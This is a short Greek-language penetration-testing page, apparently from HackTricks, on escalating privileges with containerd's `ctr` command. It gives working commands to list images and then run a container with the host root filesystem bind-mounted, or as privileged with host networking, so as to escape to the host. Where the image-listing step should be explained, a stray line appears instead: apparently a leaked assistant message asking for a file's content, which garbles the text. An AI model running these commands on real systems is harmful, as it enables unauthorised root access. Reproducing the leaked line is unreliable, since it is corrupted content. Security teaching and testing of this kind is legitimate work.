# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Μεταβείτε στον παρακάτω σύνδεσμο για να μάθετε **πού εντάσσονται `containerd` και `ctr` στο container stack**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Εάν βρείτε ότι ένας host περιέχει την εντολή `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Μπορείς να μου δώσεις το περιεχόμενο του αρχείου src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md ή να επιβεβαιώσεις ότι θέλεις μόνο να απαριθμήσω τα ονόματα/συνδέσμους των εικόνων που περιέχει; Χρειάζομαι το αρχείο ή το περιεχόμενο για να εξάγω τις εικόνες.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Και στη συνέχεια **τρέξτε ένα από αυτά τα images προσαρτώντας σε αυτό το host root folder**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Τρέξτε ένα privileged container και κάντε escape από αυτό.\
Μπορείτε να τρέξετε ένα privileged container ως:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε μερικές από τις τεχνικές που αναφέρονται στην παρακάτω σελίδα για να **δραπετεύσετε από αυτό εκμεταλλευόμενοι προνομιούχες δυνατότητες**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
